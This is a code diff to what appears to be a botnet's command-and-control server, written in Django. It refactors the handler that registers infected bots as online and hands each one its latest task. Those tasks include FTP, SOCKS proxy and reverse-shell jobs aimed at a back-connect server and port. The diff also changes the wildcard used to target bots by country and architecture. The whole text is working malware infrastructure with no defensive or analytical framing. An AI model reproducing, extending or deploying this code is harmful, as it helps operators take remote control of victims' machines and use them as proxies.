@@ -416,42 +416,50 @@ class Handlers:
                 return HttpResponse(res.SerializeToString())
 
         elif msg_type == 2:
-            ar = BotMsg.ActivityReport()
-            ar.ParseFromString(request.body[4:])
-            uid = ar.uid.decode('utf-16-le')
-            bot = Bot.objects.get(uid=uid)
-            bot.is_online = True
-            bot.save()
+            try:
+                ar = BotMsg.ActivityReport()
+                ar.ParseFromString(request.body[4:])
+                uid = ar.uid.decode('utf-16-le')
+                bot = Bot.objects.get(uid=uid)
+                bot.is_online = True
+                bot.save()
 
-            s = {
-                'FTP': 2,
-                'Socks': 3,
-                'Reverse shell': 1
-            }
+                s = {
+                    'FTP': 2,
+                    'Socks': 3,
+                    'Reverse shell': 1
+                }
 
-            if bot.is_banned:
+                if bot.is_banned:
+                    giveaway = PanelMsg.TaskGiveaway()
+                    giveaway.is_empty = True
+                    return HttpResponse(giveaway.SerializeToString())
+
+                if len(bot.tasks.all()) == 0:
+                    giveaway = PanelMsg.TaskGiveaway()
+                    giveaway.is_empty = True
+                    return HttpResponse(giveaway.SerializeToString())
+
+                task = bot.tasks.all()[len(bot.tasks.all()) - 1]
+
+                giveaway = PanelMsg.TaskGiveaway()
+                giveaway.is_empty = False
+
+                data = IPBackConnect.objects.get(id=1).data.split(':')
+
+                giveaway.task.type = s[task.type1]
+                giveaway.task.task_id = str(task.id).encode('utf-16-le')
+                giveaway.task.server = data[0]
+                giveaway.task.port = int(data[1])
+
+                return HttpResponse(giveaway.SerializeToString())
+
+            except Exception as e:
+                print(e)
                 giveaway = PanelMsg.TaskGiveaway()
                 giveaway.is_empty = True
                 return HttpResponse(giveaway.SerializeToString())
 
-            if len(bot.tasks.all()) == 0:
-                giveaway = PanelMsg.TaskGiveaway()
-                giveaway.is_empty = True
-                return HttpResponse(giveaway.SerializeToString())
-
-            task = bot.tasks.all()[len(bot.tasks.all()) - 1]
-
-            giveaway = PanelMsg.TaskGiveaway()
-            giveaway.is_empty = False
-
-            data = IPBackConnect.objects.get(id=1).data.split(':')
-
-            giveaway.task.type = s[task.type1]
-            giveaway.task.task_id = str(task.id).encode('utf-16-le')
-            giveaway.task.server = data[0]
-            giveaway.task.port = int(data[1])
-
-            return HttpResponse(giveaway.SerializeToString())
 
         elif msg_type == 3:
             task = BotMsg.TaskCompleted()
@@ -544,9 +552,9 @@ class Handlers:
         bots = [s[win] for win in wins if len(s[win]) != 0]
         try:
             if 'x32_64' in x_oc:
-                _bots = [bot for bot in bots[0] if (bot.country == country.upper() if country != 'WW' else True)]
+                _bots = [bot for bot in bots[0] if (bot.country == country.upper() if country != '*' else True)]
             else:
-                _bots = [bot for bot in bots[0] if ('x32' if bot.is_x64 is False else 'x64') in x_oc and (bot.country == country.upper() if country != 'WW' else True)]
+                _bots = [bot for bot in bots[0] if ('x32' if bot.is_x64 is False else 'x64') in x_oc and (bot.country == country.upper() if country != '*' else True)]
         except:
             _bots = []
 
